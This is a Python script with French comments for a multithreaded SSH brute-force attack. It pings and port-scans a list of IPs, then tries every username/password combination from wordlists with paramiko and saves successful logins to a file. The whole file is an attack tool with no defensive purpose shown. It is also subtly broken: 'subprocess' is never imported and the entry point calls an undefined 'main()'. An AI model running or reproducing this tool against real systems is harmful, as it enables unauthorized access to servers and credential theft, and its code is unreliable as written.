import socket
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from tqdm import tqdm
import os
import platform
import paramiko

# Initialisation des couleurs
init(autoreset=True)

# Fichiers
IP_FILE = 'ip.txt'
USER_FILE = 'user.txt'
PASS_FILE = 'password.txt'
GOOD_FILE = 'good.txt'
LOG_FILE = 'log.txt'
SCAN_RESULT_FILE = 'scan_results.txt'

# Verrous
log_lock = threading.Lock()
good_lock = threading.Lock()
count_lock = threading.Lock()

# Statistiques
success_count = 0
fail_count = 0

def read_file(filepath):
    try:
        with open(filepath, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            print(f"{Fore.RED}[ERREUR] Le fichier {filepath} est vide.")
        return lines
    except FileNotFoundError:
        print(f"{Fore.RED}[ERREUR] Le fichier {filepath} est introuvable.")
        return []

def clean_log_file():
    open(LOG_FILE, 'w').close()

def log_error(message):
    with log_lock:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def save_good(ip, user, password):
    with good_lock:
        with open(GOOD_FILE, 'a') as f:
            f.write(f"{ip} | {user} | {password}\n")

def is_host_reachable(ip, timeout=1):
    """
    Vérifie si l'hôte est accessible via ping.
    """
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    try:
        result = subprocess.run(['ping', param, '1', ip],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        return result.returncode == 0
    except Exception:
        return False

def test_ssh_connection(combo, timeout, port, quiet, progress):
    global success_count, fail_count
    ip, user, password = combo
    start = time.time()
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=user, password=password, timeout=timeout)
        client.close()
        duration = round(time.time() - start, 2)
        print(f"{Fore.GREEN}[SUCCÈS] {ip} | {user} | {password} ({duration}s)")
        save_good(ip, user, password)
        with count_lock:
            success_count += 1
    except paramiko.AuthenticationException:
        duration = round(time.time() - start, 2)
        if not quiet:
            print(f"{Fore.YELLOW}[ÉCHEC] {ip} | {user} | {password} ({duration}s)")
        log_error(f"[ÉCHEC] {ip} | {user} | {password} : Authentication failed")
        with count_lock:
            fail_count += 1
    except Exception as e:
        duration = round(time.time() - start, 2)
        if not quiet:
            print(f"{Fore.RED}[ERREUR] {ip} | {user} | {password} ({duration}s) - {str(e)}")
        log_error(f"[ERREUR] {ip} | {user} | {password} : {str(e)}")
        with count_lock:
            fail_count += 1
    finally:
        progress.update(1)

def scan_ports():
    ips = read_file(IP_FILE)
    if not ips:
        print(f"{Fore.RED}[ERREUR] Vérifiez le fichier {IP_FILE}.")
        return

    ports_to_scan = [22, 80, 443]
    open_ports = {}

    print(f"{Fore.CYAN}[INFO] Démarrage du scan des ports...")

    for ip in ips:
        open_ports[ip] = []
        for port in ports_to_scan:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                try:
                    s.connect((ip, port))
                    open_ports[ip].append(port)
                except:
                    continue

    with open(SCAN_RESULT_FILE, 'w') as f:
        for ip, ports in open_ports.items():
            if ports:
                ports_str = ', '.join(str(p) for p in ports)
                f.write(f"{ip}: {ports_str}\n")
                print(f"{Fore.GREEN}[OUVERT] {ip}: {ports_str}")
            else:
                f.write(f"{ip}: Aucun port ouvert détecté\n")
                print(f"{Fore.YELLOW}[FERMÉ] {ip}: Aucun port ouvert détecté")

    print(f"{Fore.CYAN}[INFO] Résultats du scan sauvegardés dans {SCAN_RESULT_FILE}")

def brute_force_ssh():
    global success_count, fail_count

    parser = argparse.ArgumentParser(description="Scanner SSH multi-threadé avec barre de progression")
    parser.add_argument("--timeout", type=int, default=5, help="Temps d'attente (secondes) par tentative")
    parser.add_argument("--threads", type=int, default=50, help="Nombre maximum de threads")
    parser.add_argument("--port", type=int, default=22, help="Port SSH à utiliser")
    parser.add_argument("--quiet", action='store_true', help="Mode silencieux : affiche uniquement les succès et la barre de progression")
    args = parser.parse_args()

    # Nettoyage du fichier log
    clean_log_file()

    ips = read_file(IP_FILE)
    users = read_file(USER_FILE)
    passwords = read_file(PASS_FILE)

    if not (ips and users and passwords):
        print(f"{Fore.RED}[ERREUR] Vérifiez les fichiers requis.")
        return

    # Filtrer les IPs accessibles
    print(f"{Fore.CYAN}[INFO] Vérification de l'accessibilité des IPs...")
    reachable_ips = [ip for ip in ips if is_host_reachable(ip)]
    if not reachable_ips:
        print(f"{Fore.RED}[ERREUR] Aucune IP accessible détectée.")
        return

    combos = [(ip, user, password) for ip in reachable_ips for user in users for password in passwords]
    print(f"{Fore.CYAN}[INFO] Lancement de {len(combos)} combinaisons avec {args.threads} threads...\n")

    start_time = time.time()

    with tqdm(total=len(combos), desc="Progression", ncols=75) as progress:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for combo in combos:
                executor.submit(test_ssh_connection, combo, args.timeout, args.port, args.quiet, progress)

    duration = round(time.time() - start_time, 2)

    print(f"\n{Style.BRIGHT}===== RÉSUMÉ =====")
    print(f"{Fore.GREEN}Succès : {success_count}")
    print(f"{Fore.RED}Échecs : {fail_count}")
    print(f"{Fore.BLUE}Durée totale : {duration} secondes")
    print("==================")

if __name__ == "__main__":
    main()
